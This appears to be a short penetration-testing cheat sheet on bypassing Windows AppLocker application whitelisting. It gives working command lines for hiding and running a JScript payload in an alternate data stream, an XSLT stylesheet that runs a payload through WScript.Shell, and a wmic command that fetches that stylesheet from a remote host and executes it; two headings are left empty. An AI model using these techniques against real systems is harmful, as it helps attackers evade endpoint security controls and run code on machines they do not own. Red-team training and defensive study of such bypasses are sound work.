# Application Whitelisting

### Bypass using DLLs

By default DLLs are not included in AppLocker Rules, so we might be able to execute a unmanaged DLL payload with rundll32.exe.

### Bypass using ADS

We can write a JScript payload to a whitelisted files ADS and then execute it with WScript:

```text
type payload.js > whitelisted.txt:payload.js
wscript whitelisted.txt:payload.js
```

### Bypass using 3rd Party Scripting Engine

If Python or a similar interpreter is installed we can use that to bypass AppLocker.

### Microsoft.Workflow.Compiler

### MSBuild

### JScript Execution using XSLT

```text
<?xml version='1.0'?>
<stylesheet version="1.0" xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="http://mycompany.com/mynamespace">
<output method="text"/>
    <ms:script implements-prefix="user" language="JScript">
        <![CDATA[
            var r = new ActiveXObject("WScript.Shell");
            r.Run("<payload>");
        ]]>
    </ms:script>
</stylesheet>
```

Execute with:

```text
wmic process get brief /format:"http://<ip>/payload.xsl"
```

